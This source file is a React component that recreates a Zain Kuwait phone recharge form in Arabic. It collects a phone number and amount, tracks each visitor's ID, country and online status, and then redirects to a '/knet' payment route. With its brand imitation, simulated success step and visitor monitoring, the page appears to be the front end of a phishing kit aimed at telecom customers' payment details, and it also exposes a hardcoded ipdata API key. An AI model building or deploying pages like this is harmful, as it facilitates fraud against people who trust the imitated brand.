"use client"

import type React from "react"
import { useState, useEffect, useCallback } from "react"
import { Plus, AlertCircle, CheckCircle2, CreditCard, Smartphone, Loader2, Phone, Wallet } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
import { Label } from "@/components/ui/label"
import { Input } from "@/components/ui/input"
import { Badge } from "@/components/ui/badge"

// Placeholder functions - replace with your actual implementations
const addData = async (data: any) => {
  console.log("Adding data:", data)
}

const setupOnlineStatus = (visitorId: string) => {
  console.log("Setting up online status for:", visitorId)
}

const newVisitorId = `zain-app-${Math.random().toString(36).substring(2, 15)}`

export default function ZainPaymentForm() {
  const [phone, setPhone] = useState("")
  const [paymentType, setPaymentType] = useState("other")
  const [termsAccepted, setTermsAccepted] = useState(false)
  const [amount, setAmount] = useState("6.000")
  const [selectedAmount, setSelectedAmount] = useState<string | null>(null)
  const [phoneError, setPhoneError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [activeTab, setActiveTab] = useState("bill")
  const [visitorId, setVisitorId] = useState<string | null>(null)

  useEffect(() => {
    localStorage.setItem("visitor", newVisitorId)
    setVisitorId(newVisitorId)
  }, [])

  useEffect(() => {
    localStorage.setItem("amount", amount)
  }, [amount])

  useEffect(() => {
    if (phone && (phone.length !== 8 || !/^\d+$/.test(phone))) {
      setPhoneError("يجب أن يتكون رقم الهاتف من 8 أرقام صحيحة.")
    } else {
      setPhoneError("")
    }
  }, [phone])

  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "")
    if (value.length <= 8) {
      setPhone(value)
    }
  }

  const handleAmountSelect = (value: string) => {
    setSelectedAmount(value)
    localStorage.setItem("amount", value)
    setAmount(value)
  }

  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return

    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
      })
      localStorage.setItem("country", country)
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error",
      })
    }
  }, [visitorId])

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog()
    }
  }, [visitorId, getLocationAndLog])

  const handleSubmit = async (e: any) => {
    e.preventDefault()
    setIsLoading(true)

    if (!isFormValid || !visitorId) return

    try {
      await addData({
        id: visitorId,
        phone: phone,
        amount: amount,
        timestamp: new Date().toISOString(),
        action: "payment_submit_attempt",
      })

      await addData({
        id: visitorId,
        action: "payment_submit_success_simulation",
        status: "simulated_success",
      })

      window.location.href = "/knet"
    } catch (error) {
      console.error("Submission error:", error)
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error),
      })
    } finally {
      setIsLoading(false)
    }
  }

  const isFormValid = phone.length === 8 && Number.parseFloat(amount) > 0

  const rechargeOptions = [
    { value: "6.000", label: "6.000 د.ك", duration: "30 يوم", popular: false },
    { value: "10.000", label: "10.000 د.ك", duration: "60 يوم", popular: true },
    { value: "15.000", label: "15.000 د.ك", duration: "90 يوم", popular: false },
    { value: "30.000", label: "30.000 د.ك", duration: "120 يوم", popular: false },
    { value: "40.000", label: "40.000 د.ك", duration: "150 يوم", popular: false },
    { value: "50.000", label: "50.000 د.ك", duration: "200 يوم", popular: false },
  ]

  return (
    <div className="min-h-screen bg-gradient-to-br from-rose-50 via-white to-purple-50">
      {/* Header */}
      <div className="bg-gradient-to-r from-rose-600 to-purple-600 text-white p-6 shadow-lg">
        <div className="max-w-md mx-auto">
          <div className="flex items-center gap-3 mb-2">
            <div className="w-10 h-10 bg-white/20 rounded-full flex items-center justify-center">
              <Smartphone className="w-5 h-5" />
            </div>
            <h1 className="text-xl font-bold">زين الكويت</h1>
          </div>
          <p className="text-rose-100 text-sm">إعادة تعبئة سريعة وآمنة</p>
        </div>
      </div>

      <form dir="rtl" onSubmit={handleSubmit} className="p-4 pb-8">
        <div className="max-w-md mx-auto space-y-6">
          {/* Tab Navigation */}
          <Card className="shadow-lg border-0 bg-white/80 backdrop-blur-sm">
            <CardContent className="p-0">
              <div className="grid grid-cols-2">
                <button
                  type="button"
                  onClick={() => setActiveTab("bill")}
                  className={`p-4 text-center font-semibold transition-all duration-300 rounded-tl-lg ${
                    activeTab === "bill"
                      ? "bg-gradient-to-r from-rose-900 to-blue-500 text-white shadow-lg"
                      : "text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  <CreditCard className="w-5 h-5 mx-auto mb-1" />
                  دفع الفاتورة
                </button>
                <button
                  type="button"
                  onClick={() => setActiveTab("ess")}
                  className={`p-4 text-center font-semibold transition-all duration-300 rounded-tr-lg ${
                    activeTab === "ess"
                      ? "bg-gradient-to-r from-rose-500 to-purple-500 text-white shadow-lg"
                      : "text-gray-600 hover:bg-gray-50"
                  }`}
                >
                  <Wallet className="w-5 h-5 mx-auto mb-1" />
                  إعادة تعبئة eeZee
                </button>
              </div>
            </CardContent>
          </Card>

          {/* Main Form Card */}
          <Card className="shadow-xl border-0 bg-white/90 backdrop-blur-sm overflow-hidden">
            <CardHeader className="bg-gradient-to-r from-gray-50 to-gray-100 border-b">
              <CardTitle className="text-lg font-bold text-gray-800 flex items-center gap-2">
                <Phone className="w-5 h-5 text-rose-500" />
                أود أن أعيد التعبئة لـ
              </CardTitle>
            </CardHeader>
            <CardContent className="p-6 space-y-6">
              {/* Phone Number Input */}
              <div className="space-y-3">
                <Label className="text-sm font-semibold text-gray-700 flex items-center justify-between">
                  <span>رقم الهاتف</span>
                  <Badge variant="secondary" className="bg-rose-100 text-rose-700 border-rose-200">
                    مطلوب
                  </Badge>
                </Label>
                <div className="relative">
                  <Input
                    type="tel"
                    placeholder="XXXXXXXX"
                    value={phone}
                    onChange={handlePhoneChange}
                    maxLength={8}
                    className={`h-14 text-lg font-mono bg-white border-2 transition-all duration-300 text-right pr-12 ${
                      phoneError
                        ? "border-red-400 focus:border-red-500 focus:ring-red-200"
                        : phone.length === 8
                          ? "border-green-400 focus:border-green-500 focus:ring-green-200"
                          : "border-gray-200 focus:border-rose-400 focus:ring-rose-200"
                    }`}
                    dir="rtl"
                  />
                  <div className="absolute right-4 top-1/2 transform -translate-y-1/2">
                    <Phone className="w-5 h-5 text-gray-400" />
                  </div>
                  {phone.length === 8 && !phoneError && (
                    <CheckCircle2 className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-green-500" />
                  )}
                  {phoneError && phone.length > 0 && (
                    <AlertCircle className="absolute left-4 top-1/2 transform -translate-y-1/2 w-5 h-5 text-red-500" />
                  )}
                </div>
                {phoneError && (
                  <div className="flex items-center gap-2 text-sm text-red-600 bg-red-50 p-3 rounded-lg border border-red-200">
                    <AlertCircle className="w-4 h-4 flex-shrink-0" />
                    <p>{phoneError}</p>
                  </div>
                )}
              </div>

              {/* Amount Selection */}
              <div className="space-y-4">
                <Label className="text-sm font-semibold text-gray-700">مبلغ التعبئة</Label>
                <div className="grid gap-3">
                  {rechargeOptions.map((option) => (
                    <div
                      key={option.value}
                      className={`relative p-4 rounded-xl border-2 cursor-pointer transition-all duration-300 ${
                        amount === option.value
                          ? "border-rose-400 bg-gradient-to-r from-rose-50 to-purple-50 shadow-md"
                          : "border-gray-200 hover:border-gray-300 bg-white hover:shadow-sm"
                      }`}
                      onClick={() => setAmount(option.value)}
                    >
                      {option.popular && (
                        <Badge className="absolute -top-2 right-4 bg-gradient-to-r from-rose-500 to-purple-500 text-white">
                          الأكثر شعبية
                        </Badge>
                      )}
                      <div className="flex items-center justify-between">
                        <div className="flex items-center gap-3">
                          <div
                            className={`w-5 h-5 rounded-full border-2 transition-all duration-300 ${
                              amount === option.value ? "border-rose-500 bg-rose-500" : "border-gray-300"
                            }`}
                          >
                            {amount === option.value && (
                              <div className="w-full h-full rounded-full bg-white scale-50"></div>
                            )}
                          </div>
                          <div>
                            <div className="font-bold text-lg text-gray-800">{option.label}</div>
                            <div className="text-sm text-gray-500">{option.duration}</div>
                          </div>
                        </div>
                      </div>
                    </div>
                  ))}
                </div>
              </div>

              {/* Add Another Number Button */}
              <Button
                type="button"
                variant="outline"
                disabled
                className="w-full h-12 border-dashed border-2 border-gray-300 text-gray-500 hover:border-gray-400 transition-colors"
              >
                <Plus className="w-4 h-4 mr-2" />
                أضف رقم آخر
              </Button>
            </CardContent>
          </Card>

          {/* Summary Card */}
          <Card className="shadow-xl border-0 bg-gradient-to-r from-green-50 to-emerald-50">
            <CardContent className="p-6">
              <div className="flex items-center justify-between text-2xl font-bold">
                <span className="text-gray-800">إجمالي</span>
                <span className="text-green-600 flex items-center gap-1">
                  {amount}
                  <span className="text-lg">د.ك</span>
                </span>
              </div>
            </CardContent>
          </Card>

          {/* Submit Button */}
          <Button
            type="submit"
            disabled={!isFormValid || isLoading}
            className={`w-full h-14 text-lg font-bold transition-all duration-300 ${
              isFormValid
                ? "bg-gradient-to-r from-rose-500 to-purple-600 hover:from-rose-600 hover:to-purple-700 shadow-lg hover:shadow-xl transform hover:scale-[1.02]"
                : "bg-gray-300 text-gray-500 cursor-not-allowed"
            }`}
          >
            {isLoading ? (
              <div className="flex items-center gap-2">
                <Loader2 className="w-5 h-5 animate-spin" />
                جاري المعالجة...
              </div>
            ) : (
              "أعد التعبئة الآن"
            )}
          </Button>
        </div>
      </form>

      {/* Loading Overlay */}
      {isLoading && (
        <div className="fixed inset-0 bg-black/50 backdrop-blur-sm flex items-center justify-center z-50">
          <Card className="p-8 bg-white shadow-2xl">
            <div className="flex flex-col items-center gap-4">
              <Loader2 className="w-8 h-8 animate-spin text-rose-500" />
              <p className="text-lg font-semibold text-gray-700">جاري معالجة طلبك...</p>
            </div>
          </Card>
        </div>
      )}
    </div>
  )
}
